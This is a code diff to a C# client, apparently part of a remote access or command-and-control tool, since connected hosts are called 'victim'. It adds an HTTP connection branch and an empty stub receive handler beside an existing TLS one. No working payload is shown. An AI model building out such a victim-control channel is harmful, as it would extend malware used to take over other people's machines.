@@ -475,7 +475,20 @@ namespace winClient48
 
         void fnHttpRecv(clsVictim victim)
         {
+            try
+            {
+                if (victim == null)
+                    return;
 
+                Socket sktClnt = victim.socket;
+                clsDSP dsp = null;
+
+
+            }
+            catch (Exception ex)
+            {
+
+            }
         }
 
         /// <summary>
@@ -2735,6 +2748,15 @@ namespace winClient48
                     clsVictim victim = new clsVictim(client.Client, ssl);
 
                     new Thread(() => fnTlsRecv(victim)).Start();
+                }
+                else if (m_protocol == clsVictim.enProtocol.HTTP)
+                {
+                    TcpClient client = new TcpClient();
+                    client.Connect(ip, port);
+
+                    clsVictim victim = new clsVictim(client.Client);
+
+                    new Thread(() => fnHttpRecv(victim)).Start();
                 }
 
                 is_connected = true;
